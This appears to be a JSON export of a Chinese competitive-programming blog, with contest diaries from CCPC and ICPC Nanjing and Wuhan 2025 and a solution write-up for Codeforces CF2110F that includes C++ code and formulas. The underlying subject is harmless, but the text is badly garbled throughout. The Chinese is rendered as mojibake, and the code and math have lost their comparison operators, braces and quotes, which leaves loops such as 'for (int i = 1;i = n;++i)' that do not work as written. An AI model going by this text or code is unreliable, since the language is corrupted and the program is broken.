åˆ†åˆ«çœ‹äº†ã€Šä½¿ã€‹ã€Šå²ã€‹ï¼Œä»¥ä¸ºå¯åšè¿˜å°è¯•äº†ä¸€ä¼šå„¿ï¼ˆäº‹å®ä¸Šï¼Œä¸¤ä¸ªé¢˜éƒ½æ˜¯ hardï¼Œç”šè‡³æ˜¯ if you are bored é¢˜ã€‚æ¯•ç«Ÿé¢˜ç›®åç§°éƒ½æ˜¯ shi äº†ï¼Œæˆ‘ä»¬ç«Ÿç„¶è¿˜æ•¢åƒï¼‰Zlw æƒ³äº† K ä½†æ˜¯ä¸€ç›´æ‰¾ä¸åˆ° KMP çš„ä¸€äº›æ€§è´¨ï¼Œäºæ˜¯ä»–æƒ³ M å»äº†ï¼Œæˆ‘å’Œ Sky æƒ³ Bã€‚ Zlw è¯´æƒ³åˆ° M äº†ï¼Œäºæ˜¯æŠŠæˆ‘ä»¬è¸¹ä¸‹å»å®ç°ã€‚æˆ‘å’Œ Sky ä¸€åº¦ä»¥ä¸ºè‡ªå·±æ‰¾åˆ°æ­£ç¡®çš„é€’æ¨å¼ï¼Œä½†æ˜¯ä¹‹ååœ¨éªŒè¯åˆ«çš„æ•°æ®æ—¶æ‰å‘ç°æˆ‘ä»¬åªæ˜¯æ‹Ÿåˆæ€ªç½¢äº†ã€‚Zlw åœ¨ç»å†äº† $114514^{1919810}$ ç§’çš„å †å±åç»ˆäºå†™äº†ä¸ªé è°±çš„åšæ³•ï¼Œä½†æ˜¯æäº¤ WAã€‚æœŸé—´æˆ‘ä¸Šæœºæ•²äº†ä¸€ä¸ªæš´åŠ›ï¼Œæƒ³æ‰¾è§„å¾‹ï¼Œç»“æœ $n$ å¼€å¾—å¤ªå¤§ï¼Œç„¶åè¾“å‡ºè·¯å¾„ç›´æ¥æŠŠ vscode å¼„çˆ†äº†ï¼Œå¼ºåˆ¶é—ªé€€ç„¶åè¿›ä¸å»ï¼Œå¼ºåˆ¶å…³é—­æ‰è§£å†³é—®é¢˜ï¼Œè¿˜å¥½ vscode æœ‰ç¥ç§˜è‡ªåŠ¨ä¿å­˜ï¼Œå¦åˆ™ zlw çš„ä»£ç å°±è¦é‡æ•²ä¸€éƒ¨åˆ†äº†ï¼ˆåŠ¨åŠ¨æ‰‹ Ctrl + S å¾ˆéš¾å˜›ğŸ¤¬ï¼‰ã€‚Zlw çœ‹ä¸å‡ºæ¥é”™å“ªäº†ï¼Œåªå¥½å¯¹æ‹ã€‚æœŸé—´çš„ fun fact æ˜¯ä»¥ä¸ºæš´åŠ›è¿‡æ ·ä¾‹äº†ï¼Œä½†æ˜¯å´æ²¡è¿‡ç¼–è¯‘ã€‚ä»¥åŠå†™å®Œä»¥åæƒ³æ‰¾æ¨¡æ¿é‡Œçš„ cmp.sh ç»“æœå‘ç°ç¬¬ä¸€æœ¬çš„æ¨¡æ¿ version 1.0 é‡Œæ²¡æœ‰ï¼Œç„¶åç¬¬äºŒæœ¬çš„åœ¨æœ€åä¸€é¡µï¼Œä½†æ˜¯è²Œä¼¼ä¹‹å‰æ‰“æ¯”èµ›çš„æ—¶å€™ç–‘ä¼¼ä¸å°å¿ƒè¢«æ‰¯æ‰äº†ï¼Œå°±æ˜¯ç¼ºäº†è¿™ä¸€é¡µï¼ˆï¼ˆï¼ˆï¼Œäºæ˜¯åªèƒ½æ‰‹åŠ¨å¯¹æ‹ã€‚å‘ç°æ˜¯ä¸ªå¼±æ™ºçš„é”™è¯¯ï¼ŒæŠŠ $-v$ æ•²æˆäº† $-1$ã€‚ç¬¬äºŒå‘æäº¤é€šè¿‡ï¼Œå‘ç°å·²ç»å°æ¦œäº†ã€‚ ç„¶åä¸‰ä¸ªäººä¸€èµ·åš Bï¼Œç»ˆäºæ¨å¯¹äº†å¼å­ï¼Œè¿™æ—¶å€™è¿˜å‰© 20 minï¼Œäºæ˜¯æˆ‘æ•²çŸ©é˜µä¼˜åŒ–ï¼Œä»–ä¿©æ¨å¼å­ã€‚è¿˜å‰© 2 min çš„æ—¶å€™å¼„å®Œäº†ï¼Œå‘ç°è¿‡äº†è‡ªæµ‹ï¼Œç›´æ¥äº¤ï¼ŒWAï¼æµ‹æ ·ä¾‹å¤§æ•°æ®ï¼Œå‘ç°æœ‰åœ°æ–¹å¿˜è®°å¼€ long long äº†ï¼Œå†äº¤ï¼ŒWAï¼ç„¶åæ‰¾é”™ï¼Œå‘ç°æ²¡è¿‡å…¨é›¶çš„æ ·ä¾‹ã€‚å‘ç°åˆå§‹åŒ–æœ‰åœ°æ–¹ä¸å¯¹ï¼Œä½†æ˜¯æ­£æƒ³è¦ä¿®æ”¹å‘ç°å·²ç»æ¯”èµ›ç»“æŸäº†ï¼è¯´å®åœ¨æœ‰ç‚¹å¯æƒœï¼Œæœ¬æ¥ä»¥ä¸ºè¦é¡½å¼ºæ‹¼æå¥–äº†ï¼ˆä½†åæ¥å‘ç°ï¼Œè¿™é¢˜è¿‡äº†ä¹Ÿæ²¡ Ag äº†ï¼‰ã€‚ å¥½å§ï¼Œè¿™åœºå°±ç¬¬ä¸€å°æ—¶å’Œæœ€åä¸€å°æ—¶æœ‰æäº¤ï¼Œå…¨åœºå€’é—­ï¼ŒCu ç‰Œä¸€æšï¼ˆè¿™å°±æ˜¯é©¬ä¸Šè¦æ‰“ EC final çš„é˜Ÿä¼çš„æ°´å¹³å—ï¼‰ã€‚æ„Ÿè§‰æ‰“çš„å¤ªçƒ‚äº†ï¼ˆå°¤å…¶æ˜¯æˆ‘ï¼Œä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæˆ‘æ“…é•¿çš„é¢˜ï¼Œå› æ­¤è´¡çŒ®å¾ˆå°ï¼‰ï¼Œä¸æƒ³å»é¢†å¥–ã€‚äºæ˜¯èšé›†äº†é¤åˆ¸ï¼Œç›´æ¥å»é£Ÿå ‚æ¶ˆè´¹ä¸€æ³¢ï¼ˆä¹°å®Œæƒ³åƒçš„ä»¥åï¼Œå…¨éƒ¨ç”¨æ¥è¿›è´§é¢åŒ…äº†ï¼‰ï¼Œç„¶ååˆäº†ä¸ªå½±ï¼Œå›å®¾é¦†ä¼‘æ¯äº†ã€‚å¥½åœ¨æ˜å¤©æ™šä¸Šçš„é£æœºï¼Œè¿˜èƒ½å»ç©ä¼šå„¿ã€‚ åè®° è¿™åœºæ„Ÿè§‰æ‰“å¾—å¤ªæ¾æ•£äº†ï¼Œä¹Ÿæœ‰å¯èƒ½å› ä¸ºæ˜¯ CCPCï¼Œæ‰€ä»¥ä¸å¤Ÿé‡è§†å¯¼è‡´çš„ã€‚ä½†è¿™åœºæ²¡æœ‰è®¡ç®—å‡ ä½•å’Œæ„é€ ï¼Œè¿™æ˜¯ä¸å¥½çš„ï¼ï¼ˆEC final è¦ç­‰æœŸæœ«å®Œå†è®­ç»ƒäº†ï¼Œå¸Œæœ›èƒ½æ‹¿ä¸ªç‰Œç‰Œå§ï¼‰ é©¬ä¸Šè¦æœŸæœ«è€ƒäº†ï¼Œçªç„¶æ„Ÿè§‰æ—¶é—´æœ‰ç‚¹ç´§å¼ ï¼Œä½†æ˜¯å…ˆæ‘†ä¸€ä¼šå„¿å†è¯´ã€‚è¿˜è¦å‡†å¤‡ç»™ CSC3200 ä¸¾åŠä¸€ä¸ªå¤ä¹ è®²åº§æ¥ç€ã€‚ å‘ç°è‡ªå·±è¢«æŠ½åˆ°ä½“è‚²æŠ½æµ‹äº†ï¼Œæ‚²ï¼ä½†æ˜¯å¥½åœ¨ä»Šå¹´æŠ½æµ‹äº†ï¼Œæ˜å¹´å°±ä¸ç”¨æµ‹äº†ã€‚","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF2110F Faculty","path":"/2025/11/26/CF2110F/","content":"ä¸å¤±ä¸€èˆ¬æ€§çš„ï¼Œæˆ‘ä»¬è®¾ $x \\le y$ã€‚ ä»æœ€ç®€å•çš„æƒ…å†µè€ƒè™‘ï¼Œå½“ $x = y$ æ—¶ï¼Œ$f(x,y) = 0 + 0 = 0$ã€‚ä»¥ä¸‹å‡ä¸º $x y$ çš„æƒ…å†µï¼Œæ¨æ¨å¼å­å¯çŸ¥ï¼š f(x,y) = x \\bmod y + y \\bmod x= x + y - \\lfloor\\frac{x}{y}\\rfloor y - \\lfloor\\frac{y}{x}\\rfloor xç”±äº $x y$ï¼Œå¼å­å¯ä»¥è¿›ä¸€æ­¥åŒ–ç®€ï¼š f(x,y) = x + y - \\lfloor\\frac{y}{x}\\rfloor xç”± $x y$ å¯çŸ¥ $\\lfloor\\frac{y}{x}\\rfloor \\ge 1$ï¼Œäºæ˜¯å¯ä»¥å¾—åˆ°ä»¥ä¸‹è§‚å¯Ÿï¼š x \\le x + y \\bmod x = f(x,y) = y - (\\lfloor\\frac{y}{x}\\rfloor - 1)x \\le yåˆ†æå¯çŸ¥ï¼Œå½“ $x \\mid y$ æ—¶ä¸ç­‰å¼å·¦ä¾§å–ç­‰ï¼›å½“ $x y 2x$ æ—¶ä¸ç­‰å¼å³ä¾§å–ç­‰ã€‚ æ¥ä¸‹æ¥è€ƒè™‘å¯¹äºä»»æ„å‰ç¼€é•¿åº¦ä¸º $k$ çš„ç­”æ¡ˆæ˜¯æ€ä¹ˆå–åˆ°çš„ã€‚å½“ $n = 1$ æ—¶ç­”æ¡ˆæ˜¾ç„¶ä¸º $0$ï¼Œ$n = 2$ æ—¶ä¸º $a_1 \\bmod a_2 + a_2 \\bmod a_1$ã€‚å¯¹äº $n \\ge 3$ çš„æƒ…å†µï¼Œè€ƒè™‘ $f(x,y)$ ä¸ $f(y,z)$ æ»¡è¶³ $x \\le y \\le z$ï¼Œç”±ä¸ç­‰å¼å¯çŸ¥ $x \\le f(x,y) \\le y \\le f(y,z) \\le z$ï¼Œå› æ­¤å¯ä»¥è¯æ˜å‰ç¼€é•¿åº¦ä¸º $k$ çš„æœ€å¤§å€¼é‡Œä¸€å®šæœ‰ä¸€ä¸ªæ•°å–åˆ° $\\max \\limits_{i = 1}^k\\{a_i\\}$ã€‚ å†ç”±ä¸ç­‰å¼å¯çŸ¥å­˜åœ¨ $y \\ge 2x$ çš„æƒ…å†µæ—¶æ‰ä¼šä½¿å¾—ç­”æ¡ˆå˜å¾—ä¸ç¡®å®šï¼Œè€Œè¿™ç§æƒ…å†µæœ€å¤šåªä¼šæœ‰ $\\log$ æ¬¡ï¼Œå› æ­¤ç›´æ¥æš´åŠ›æ›´æ–°å³å¯ï¼Œæ€»æ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ã€‚ ä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (); vector int a (n + 1),ans (n + 1,0); for (int i = 1;i = n;++i) a[i] = read (); int mx = a[1]; for (int i = 2;i = n;++i) if (a[i] mx) if (a[i] = mx * 2) for (int j = 1;j i;++j) ans[i] = max (ans[i],a[i] % a[j] + a[j] % a[i]); else ans[i] = a[i]; mx = a[i]; else ans[i] = max (ans[i - 1],mx % a[i] + a[i] % mx); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts ();","categories":["Solution"]},{"title":"2025 ICPC å—äº¬ç«™","path":"/2025/11/24/ICPC Nanjing25/","content":"ICPC å—äº¬ç«™Day -1å‘¨äº”æ—©ä¸Šçš„é£æœºï¼Œè½åœ°ååœ¨é…’åº—æ¥¼ä¸‹åƒäº†é“é”…ç‚–ï¼Œè±ªèµ¤ï¼ä¼‘æ¯äº†ä¸€ä¼šå„¿æˆ‘å»å—å¤§æ‰¾æˆ‘çš„åˆä¸­åŒå­¦ç©ï¼Œæœ‰ç‚¹è¿œï¼Œåœ°é“åšäº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œè¿æ°”ä¸å¥½è¿˜ä¸‹é›¨äº†ã€‚åœ¨æ ¡å›­é‡Œéšä¾¿é€›äº†é€›ä»¥åå°±å»åƒé¥­äº†ï¼Œåƒçƒ¤é±¼ï¼ŒèŠå¤©çš„è¿‡ç¨‹ä¸­é¡ºä¾¿äº†è§£ä¸€ä¸‹ä»–ä»¬çš„è¯¾ç¨‹ï¼ˆç”±äºä¸“ä¸šç›¸è¿‘ï¼Œæ‰€ä»¥è¿˜ç™½å«–äº†ä¸ªè®¡ç®—æœºç³»ç»ŸåŸºç¡€çš„è¯¾ç¨‹é“¾æ¥ï¼‰ï¼Œç¾¡æ…•å—å¤§æœ‰è¿™ä¹ˆå¥½çš„è¯¾ç¨‹ä½“ç³»å®‰æ’ï¼ Day 0æ—©ä¸Šé—¹é’Ÿæ²¡å¬åˆ°ï¼Œè¿˜æ˜¯è¢«é˜Ÿå‹å«é†’çš„ã€‚åƒäº†æ—©é¥­ç›´æ¥å»ç­¾åˆ°ï¼Œå‚èµ›æœå¥½è¯„ï¼Œç„¶åå‚ä¸æ¸¸æˆè·å¾—ä¸€åªè¿·ä½ ç‰ˆè¢‹é¼ ã€‚éª‘ç”µç“¶è½¦é€›æ ¡å›­ï¼Œååˆ†æƒ¬æ„ï¼Œåˆšå¥½ 30 min è¿˜è½¦ï¼Œæ²¡æœ‰å¤šä»˜æ¬¾ã€‚ç„¶åæƒ³ç€æœ‰ç‚¹æ—©ï¼Œå»é£Ÿå ‚å¯ä»¥ä¹°ç‚¹å¥¶èŒ¶ï¼Œä½†æ˜¯å‘ç°é¤åˆ¸æœ‰æ•ˆèŒƒå›´è¿‡å°ï¼Œäºæ˜¯å°±åä¸‹æ­‡ç€ï¼Œå¼€å§‹æ‘†å¼„è¢‹é¼ ã€‚ ä¸‹åˆçƒ­èº«èµ›ï¼Œç«Ÿç„¶è¦å­˜åŒ…ï¼ˆå¥½åƒè¢«è¯´äº†ï¼Œåæ¥è´Ÿè´£äººå’Œä¿å®‰æ²Ÿé€šäº†å°±ä¸ç”¨äº†ï¼‰ã€‚è·å¾—ä¸€åªå¤§è¢‹é¼ ï¼Œå¼€èµ›å‰åˆæ˜¯å„ç§è¢‹é¼ æ‘† pos çš„ä¼ ç»Ÿï¼Œç¾¤é‡Œå›¾ç‰‡ä¹±é£ã€‚çƒ­èº«èµ›æœç„¶éƒ½æ˜¯è¢‹é¼ é¢˜ï¼Œå…¶ä¸­ä¸‰é“åšè¿‡ï¼Œäºæ˜¯å¾ˆå¿«åœ°å†æ¬¡å¤ç°äº†å‡ºæ¥ã€‚è¿˜æœ‰ä¸¤é“é¢˜æˆ‘ä»¬åˆ†å·¥ï¼Œç„¶åå·®ä¸å¤šéƒ½æœ‰æ€è·¯ï¼Œäºæ˜¯ä¸Šæœºå†™ã€‚ä½†æ‰€å‰©æ—¶é—´ä¸å¤šï¼ˆç”±äºä¸€å¼€å§‹å‘ç°é¢˜ç›®åŸºæœ¬åšè¿‡ï¼Œäºæ˜¯å»è°ƒ bash äº†ï¼Œæ‰€ä»¥æ²¡å‰©å¤šå°‘æ—¶é—´å†™é¢˜ï¼‰ï¼Œæœ€åè¿™ä¸¤é¢˜æ²¡è¿‡ï¼Œæ‰“ç®—æ™šä¸Šè¡¥ä¸€ä¸‹ã€‚å›å»è·¯ä¸Šç®€å•ç…äº†é¢˜è§£ï¼Œå‘ç°æ€è·¯éƒ½æ˜¯å¯¹çš„ï¼Œæ‰€ä»¥è¯´æ˜¯å£èƒ¡ AKï¼ˆã€‚ Day 1å¼€å±€è‰¯å¿ƒç­¾åˆ°ï¼Œé£é€Ÿé€šè¿‡ã€‚ä¹‹åæ˜¯ä¸€ä¸ªè±¡æ£‹çš„ç®€åŒ–ç‰ˆï¼Œæƒ³äº†ä¸€ä¸‹å‘ç°åªéœ€è¦åˆ¤æ–­ä¸€æ­¥å³å¯å¾—åˆ°ç»“æœã€‚ç„¶åæˆ‘ç¬¬ä¸€ååº”æ˜¯ç›´æ¥åˆ—å‡ºæ‰€æœ‰æƒ…å†µï¼Œç–¯ç‹‚æ•² if ç„¶å WAï¼Œå†·é™äº†ä¸€ä¸‹ç›´æ¥å¾ªç¯æšä¸¾æ‰€æœ‰æƒ…å†µï¼Œç„¶ååˆ WAï¼Œçªäº†å¥½ä¹…æ‰å‘ç°æœ‰ä¸€ä¸ª $dy$ æ•²æˆäº† $dx$ã€‚æˆç½ªäººäº† WA äº†ä¸‰å‘ 1h æ‰è¿‡ã€‚ ä¹‹å Zlw ä½¬å‘ç° F æ˜¯ä¸€ä¸ªè´ªå¿ƒåŠ  bfs çš„é¢˜ï¼Œæ•²å®Œä¸€å‘é€šè¿‡ã€‚è·Ÿäº†ä¸€ä¸‹æ¦œå‘ç° G,I æœ‰ä¸€è½¦äººé€šè¿‡ï¼Œä½†æ˜¯æƒ³äº†æƒ³è¿™ä¸¤é¢˜å‘ç°æˆ‘ä»¬ä¸‰äººéƒ½ä¸ä¼šã€‚ä½¬æå‡ºæˆ‘ä»¬åº”è¯¥å¤šçœ‹ä¸€ç‚¹é¢˜ï¼Œäºæ˜¯å¼€äº† Hï¼Œå‘ç°å¯åšã€‚ ä»¥ä¸‹è¯æ˜ SUNCHAOYI æ˜¯å…¥æœºï¼š Zlw: è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥å…ˆé¢„å¤„ç†å‡º $f_{l,r}$ è¡¨ç¤ºè¿™æ®µåŒºé—´å†…æœ‰å¤šå°‘ä¸ªæ»¡è¶³ä¸­é—´æ¡ä»¶é™åˆ¶çš„æ•°é‡ã€‚ä½†æ˜¯æ€ä¹ˆå¿«é€Ÿå¤„ç†å‡ºæ¥å‘¢ï¼Ÿ Scy: å…ˆä¸ç®¡å‰ç¼€ï¼Œæšä¸¾ä¸¤ä¸ªé‡å¤å­ä¸²çš„åŒä¸€ä¾§ç«¯ç‚¹ï¼Œç„¶åå°±å¯ä»¥æŠŠ border è½¬åŒ–æˆå“ˆå¸Œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰çš„é—®é¢˜ï¼Œç”¨äºŒåˆ†åŠ ä¸ª log å°±è¡Œã€‚ Zlw: å“¦æœ‰é“ç†ï¼Œé‚£ä¹ˆç›¸å½“äºå‰ç¼€å°±æ˜¯ç­‰å·®æ•°åˆ—çš„è´¡çŒ®ï¼Œéšä¾¿ç»´æŠ¤ä¸€ä¸‹å°±å¥½äº†ã€‚ Scy: å¯¹ï¼Œå¯ä»¥ç”¨å·®åˆ†ä»£æ›¿çº¿æ®µæ ‘ã€‚ Zlw: é‚£ä¸¤ä¾§çš„ç­”æ¡ˆæ€ä¹ˆç»Ÿè®¡å‘¢ï¼Ÿå¥½åƒå’Œåˆšåˆšçš„è¿‡ç¨‹æœ‰ç‚¹åƒã€‚ Scy: å‰ç¼€å’Œå°±è¡Œäº†ã€‚ Zlw: å“ï¼Œé‚£å¥½åƒè¿™é¢˜åšå®Œäº†ã€‚ Zlw: å•Šå‘€ï¼Œå·®åˆ†å’‹å†™æ¥ç€ï¼Ÿ Scy: ä¸¤æ¬¡å‰ç¼€å’Œï¼Œé˜¿å·´é˜¿å·´é˜¿å·´ï¼ è¯æ˜å®Œæ¯•ã€‚prompt æ­£ç¡®ï¼Œç›´æ¥èƒ¡å‡ºæ¥äº†ã€‚ ç„¶åå°±è¿‡æ ·ä¾‹äº†ï¼Œå·®ç‚¹å¿˜è®°å–æ¨¡ï¼Œç„¶åæäº¤ï¼æµ‹äº†ä¸€ä¸‡å¹´ï¼Œä¸€å‘é€šè¿‡ï¼ ç„¶åå‰©ä¸‹çš„ä¸¤ä¸ªå°æ—¶ç–¯ç‹‚çš„åœ¨ G,I ä¹‹é—´å¾˜å¾Šï¼Œä½†æ˜¯æœ€åéƒ½ä¸ä¼šï¼Œ4 é¢˜é—æ†¾ç¦»åœºã€‚ è®²é¢˜ï¼Œå‘ç° G é¢˜å¯ä»¥å°†ä¸¤ä¸ªå‚æ•°åˆ†ç¦»ï¼Œäºæ˜¯å°±å¯ä»¥ç®€å•è´ªå¿ƒäº†ï¼Œæ‡Šæ‚”æ€ä¹ˆæ²¡æƒ³åˆ°ï¼Œä½†æ˜¯è½¬å¿µä¸€æƒ³è¿‡äº†ä¹Ÿ Au ä¸äº†ï¼Œåˆæ„Ÿè§‰è¿˜å¥½ï¼ˆbushiã€‚ æ»šæ¦œï¼Œç«Ÿç„¶æ„å¤–çš„å®ˆä½é“¶äº†ï¼Œåœ¨æ­£æ˜¯é˜Ÿä¼ä¸­æ’ 80 å¤šåï¼Œå°±è¿™æ ·å§ï¼ŒSUA é¢˜çœŸçš„å¥½éš¾ï¼ ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰æœºä¼šæ‰“ ECï¼Œæ„Ÿè§‰ç¦»é€€å½¹ä¸è¿œäº†ï¼Œæ»šå›å­¦æ ¡å­¦ CS å»äº†ã€‚ ã€èµ›åè¡¥é¢˜ã€‘ G ä¸»è¦å°±æ˜¯ç†è§£åˆå¹¶ï¼Œå³è®©è¾ƒå°å®¹é‡å’Œè¾ƒå¤§æµé€Ÿå¤±æ•ˆã€‚å°†æ¡¶åˆ†åˆ«æŒ‰ç…§å®¹é‡ç”±å°åˆ°å¤§æ’åºï¼Œè®°ä¸º $A$ï¼Œå†æŒ‰ç…§æµé€Ÿç”±å¤§åˆ°å°æ’åºï¼Œè®°ä¸º $B$ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯æœ€åéœ€è¦ä¿ç•™ $A$ ä¸ $B$ çš„ä¸€æ®µåŒæ ·é•¿åº¦çš„åç¼€ã€‚å½“æƒ³è¦å†å¤±æ•ˆä¸€ç»„å®¹é‡å’Œæµé€Ÿï¼Œå‘ç°æ°´ä¼šæ¼å®Œæ—¶ï¼Œæƒ…å†µå·²ç»ä¸ä¼˜ï¼Œå› æ­¤å¯¹äºä¸€ç»„è¯¢é—®ç›´æ¥äºŒåˆ†ç­”æ¡ˆå³å¯ã€‚ I æ˜¯ä¸€ä¸ªè¯»é¢˜ç»†èŠ‚å¾ˆå¤šçš„ DPï¼Œè¯»å®Œé¢˜åéœ€è¦æ„è¯†åˆ°éœ€è¦ä»åå¾€å‰ dpã€‚å› æ­¤ï¼Œè®¾ $dp_{i,j,opa,opb}$ å››ç»´è¡¨ç¤ºå‰ $i$ å¤©å‰© $j$ å…ƒï¼Œ$A,B$ ä¸¤äººæ˜¯å¦å·²ç»æ”¯ä»˜ä¸€æ¬¡çš„æœ€å¤§ä»·å€¼ã€‚æ³¨æ„ $j 0$ çš„çŠ¶æ€ç›´æ¥è®¾ä¸ºéæ³•ï¼Œåˆç”±äºéœ€è¦ä»åå¾€å‰ï¼Œdfs è®°å¿†åŒ–å³å¯ï¼Œä»£ç ç«Ÿç„¶å¼‚å¸¸å¥½å†™ã€‚ M ç»„åˆåŠ  NTT ä¼˜åŒ–é¢˜ï¼Œè¿˜æ˜¯ç›¸å½“çš„ä¸ç†Ÿç»ƒå•Šï¼Œå€Ÿç€ AI çš„ç†è§£åˆæ¨äº†ä¸€ä¸‡å¹´ã€‚è€ƒè™‘ $(P_i,P_{(i + d) \\bmod n})$ ä¸ºå‡¸ $k$ å¤šè¾¹å½¢çš„ä¸€æ¡è¾¹ï¼Œåˆ™ä¸¤çº¿æ®µå³ä¾§çš„ $d - 1$ ä¸ªç‚¹å¤±æ•ˆï¼Œå‰©ä½™çš„ $n - 2 - (d - 1) = n - d - 1$ ä¸ªç‚¹éœ€è¦é€‰æ‹© $k - 2$ ä¸ªç»„æˆ $k$ å‡¸å¤šè¾¹å½¢ã€‚ ä»¤ $F_d$ è¡¨ç¤ºé€‰è·ç¦»ä¸º $d$ çš„ç‚¹ä½œä¸ºä¸€æ¡è¾¹æ—¶çš„è´¡çŒ®ï¼Œåˆ™æœ‰å‡¸ $G_k$ è¾¹å½¢çš„é¢ç§¯å’Œçš„ä¸¤å€ $G_k$ ä¸º G_k = \\sum \\limits_{d = 1}^{n - 1} \\binom{n - d - 1}{k - 2}F_d \\\\ = \\frac{1}{(k - 2)!} \\sum \\limits_{d = 1}^{n - k + 1} \\frac{(n - 1 - d)!}{(n - k + 1 - d)!} F_dä»¤ $A_d = (n - d - 1)! \\times f(d)$ï¼Œ$B_d = \\frac{1}{i!}$ï¼Œåˆ™æœ‰ C_k = \\sum \\limits_{i = 1}^{k} A_i \\times B_{k - i}\\\\ G_k = \\frac{1}{(k - 2)!} C_{n - k + 1}å½“ç„¶ï¼Œè¿˜éœ€è¦å¿«é€Ÿæ±‚å‡º $F_d$ çš„å€¼ï¼Œç”¨å‰ç§¯è¡¨ç¤ºé¢ç§¯çš„ä¸¤å€ï¼Œåˆ™æœ‰ F_d = \\sum \\limits_{i = 0}^{n - 1} (x_i y_{(i + d) \\bmod n} - y_i x_{(i + d) \\bmod n})ä»¥ $\\sum \\limits_{i = 0}^{n - 1} x_i y_{(i + d) \\bmod n}$ ä¸ºä¾‹ï¼Œå…ˆå€é•¿æ•°ç»„ï¼Œä»¤ $X = [x_0,x_1,\\cdots,x_{n - 1},0,0,\\cdots,0]$ï¼Œ$Y = [y_0,y_1,\\cdots,y_{n - 1},y_0,y_1,\\cdots,y_{n - 1}]$ã€‚å†ä»¤ $Y^{rev}$ è¡¨ç¤º $Y$ çš„åè½¬æ•°ç»„ $Y^{rev} = [y_{n - 1},\\cdots,y_1,y_0,y_{n - 1},\\cdots,y_1,y_0]$ã€‚åˆ™æœ‰ H1_d = \\sum \\limits_{i = 0}^{2n - 1} X_i \\times Y_{i + d} \\\\ = \\sum \\limits_{i = 0}^{n - 1} X_i \\times Y_{i + d}\\\\ = \\sum \\limits_{i = 0}^{2n - 1 - d} X_i \\times Y^{rev}_{2n - 1 - d - i}å…¶ä¸­ä¸Šé™å¯ä»¥æ”¹å˜æ˜¯å› ä¸ºå€é•¿çš„æ—¶å€™ $x_{n} \\sim x_{2n - 1}$ å‡ä¸º $0$ï¼Œè€Œæœ€å $H_k$ ä¹Ÿå°±æ˜¯å·ç§¯å $C_{2n - d - 1}$ çš„å€¼ã€‚ è®¡ç®—å¦ä¸€åŠ $H2_d$ åŒç†ï¼Œæœ€å $F_d = H1_d - H2_d$ã€‚ åšä¸‰æ¬¡å®Œæ•´çš„ NTT å³å¯å¾—åˆ°ç­”æ¡ˆï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚","categories":["Journal"]},{"title":"2025 ICPC æ­¦æ±‰ç«™","path":"/2025/11/05/ICPC Wuhan25/","content":"ICPC æ­¦æ±‰ç«™Day -1é˜Ÿå‹è¿˜è¦è€ƒè¯•ï¼Œé‚£å’Œæˆ‘æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿæœæ–­ä¸€äººå‘¨äº”æ—©ä¸Šå‡ºå‘ã€‚12:00 èµ·é£ï¼ŒåŸæ¥é¢„è®¡ 2 ä¸ªå¤šå°æ—¶çš„è·¯ç¨‹ï¼Œç»“æœ 13:30 å°±åˆ°äº†ã€‚åˆšåœ¨é£æœºä¸Šçœ‹äº†ä¼šå„¿ç¦»æ•£çš„å·å­ï¼Œåƒäº†ç‚¹ä¸œè¥¿æç¤ºè¦é™è½äº†ã€‚ä¸è¿‡å·®è¯„çš„æ˜¯ç«Ÿç„¶æ²¡æœ‰ä¸»é£Ÿï¼Œåªå‘é¸¡è‚‰è‚ å¤§ main åŒ…ï¼Œé¥¿æ­»æˆ‘äº†è¿åƒä¸¤ä¸ªå‹‰å¼ºåƒé¥±ã€‚ ä¸‹äº†é£æœºå‘ç°åˆ°è¾¾å±‚å’Œå‡ºå‘å±‚åœ¨ä¸€èµ·ï¼Ÿçº ç»“äº†å¾ˆä¹…ï¼Œæœ€ç»ˆè¿˜æ˜¯å 2 å·çº¿å…œå…œè½¬è½¬çš„æ¥åˆ°äº†é…’åº—ï¼ˆæœ¬æ¥æƒ³å…ˆå»ç©ç©çš„ï¼Œä½†æ˜¯æƒ³ç€æœ‰è¡Œæï¼Œé¡ºä¾¿è¿˜å¾—ç»™æ‰‹æœºå……ä¸ªç”µï¼‰ã€‚ æ­‡äº†ä¼šå„¿å…ˆå»åƒäº†ç¢—çƒ­å¹²é¢ï¼Œè±ªèµ¤ğŸ˜‹ï¼ç„¶åè¶ç€ä¿©é˜Ÿå‹è€ƒ CSC4120 çš„æ—¶é—´å»æ±Ÿæ±‰è·¯æ­¥è¡Œè¡—å‡‘ä¸ªçƒ­é—¹ï¼Œç„¶ååˆå»äº†é»„é¹¤æ¥¼å’Œæ­¦æ±‰é•¿æ±Ÿå¤§æ¡¥ï¼Œæœ€åæ²¿ä¸œæ¹–éª‘è½¦å›æ¥çš„ã€‚ä»Šå¤©ä¼¼ä¹æ˜¯ä¸‡åœ£å¤œï¼Œæ‰€ä»¥æ±Ÿæ±‰è·¯ğŸ‘»è¶…å¤šï¼ˆ ä»¥åŠï¼Œæ­¦æ±‰å¤§å­¦æ„Ÿè§‰çœŸçš„å¥½å¤§ï¼Œåœ¨ç¯æ¹–éª‘éª‘äº†åŠå¤©ï¼Œåªæ˜¯ä»æ­¦æ±‰å¤§å­¦çš„ä¸€ä¸ªé—¨åˆ°å¦å¤–ä¸€ä¸ªé—¨ï¼Œç´¯é¼ ï¼ˆï¼‰ æ—©ç‚¹ç¡äº†ï¼Œæ˜å¤©æ—©ç‚¹å»ç­¾åˆ°ï¼Œç™½å«–ç¤¼å“ï¼Œé¡ºä¾¿æŠ¢å¤ºé˜Ÿå‹çš„ç‰©èµ„ï¼ Day 0ç­¾åˆ°æ—¥ã€‚ ä¸ºä»€ä¹ˆæ ¡å†…ç”µç“¶è½¦ä¸è®©æˆ‘ä»¬éª‘å•Šï¼Ÿï¼Ÿï¼Ÿåªèƒ½èµ°è·¯å‰å¾€å“å°”ä½“è‚²é¦†ã€‚ é¢†ç‰©èµ„æ‹ç…§ç‰‡ï¼Œç°åœºä¼¼ä¹æœ‰ç‚¹æ··ä¹±ï¼Œå‘ç‰Œç‰Œä¸€ç›´æ‰¾ä¸åˆ°æˆ‘ä»¬çš„å­¦æ 